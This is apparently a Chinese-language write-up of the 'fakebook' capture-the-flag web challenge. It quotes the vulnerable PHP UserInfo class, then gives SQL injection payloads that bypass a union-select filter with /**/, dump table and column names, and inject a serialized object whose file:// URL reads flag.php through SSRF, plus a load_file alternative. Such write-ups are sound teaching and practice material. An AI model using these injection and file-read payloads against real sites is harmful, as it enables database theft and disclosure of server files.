+++
title = 'fakebook'
date = 2024-09-16T18:03:22+08:00
draft = false
categories = ['CS', 'sec', 'wp']
+++

## 题目

![](../../../../img/Pasted%20image%2020240916180603.png)

---
## 分析

### join页面提交blog （URL）

点进 join页面，发现是一个提交 blog的框

![](../../../../img/Pasted%20image%2020240916180708.png)

- 对 blog 试了一些数字都提示 Blog is not valid.


### dirmap 扫描后台

用 dirmap 扫网站发现有 user.php.bak 文件
- 似乎可以扫出来有 flag.php，但是 dirmap 没扫出来

查看源码
```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        # 显然有 ssrf 漏洞
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```


可以通过在 blog输入框上传以下 payload 访问 flag.php文件

```
file:///var/html/flag.php
```


直接在 join页面上传是不行的，从服务器的备份文件可以看出这个表达式被正则表达式过滤了

![](../../../../img/Pasted%20image%2020240916180731.png)
- 返回 Blog is not valid.


### SQLi

再进入成功上传的页面，发现 no参数有 SQL注入漏洞

- 上传成功的规则见源码的正则表达式

闭合测试，发现是数字型注入
```
# 正确
?no=1 and 1=1

# 错误
?no=1' and 1=1 #
```

order by测试，发现是4列
```
?no=-1 order by 4
```

`union select` 被过滤，用 `/**/` 绕过
```
?no=-1 union/**/select 1,2,3,4
```

![](../../../../img/Pasted%20image%2020240916180744.png)


爆表名：users
```
?no=-1 union/**/select 1, group_concat(table_name),3,4 from information_schema.tables where table_schema=database();
```

![](../../../../img/Pasted%20image%2020240916180755.png)


爆列名：可疑data
```
?no=-1 union/**/select 1, group_concat(column_name),3,4 from information_schema.columns where table_name='users'
```

![](../../../../img/Pasted%20image%2020240916180802.png)


爆data列
```
?no=-1 union/**/select 1, group_concat(data),3,4 from users
```

![](../../../../img/Pasted%20image%2020240916180808.png)


### 从序列化字符串注入

```
O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:5:"sh.sh";}
```

从SQLi得到的序列化字符串可以猜测：
- join时服务器序列化blog数据
- 回显到页面时再反序列化，也就是查询的时候

所以，尝试通过对构造的序列化字符串进行查询来访问 flag.php 文件

序列化构造：
```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

查询 payload：
```
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```
- data字段在第4位，所以放在第4位

得到 flag
![](../../../../img/Pasted%20image%2020240916180818.png)
- flag{ce4753a0-ec46-4fc1-81eb-ad8a2eeaf5b2}

---
## 解2

load_file("/var/www/html/flag.php") 读文件

```
no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4
```


---
## 原理

- SSRF 漏洞
```
$output = curl_exec($ch);
```

- SQLi `/**/` 绕过

- `file://` 读取本地文件












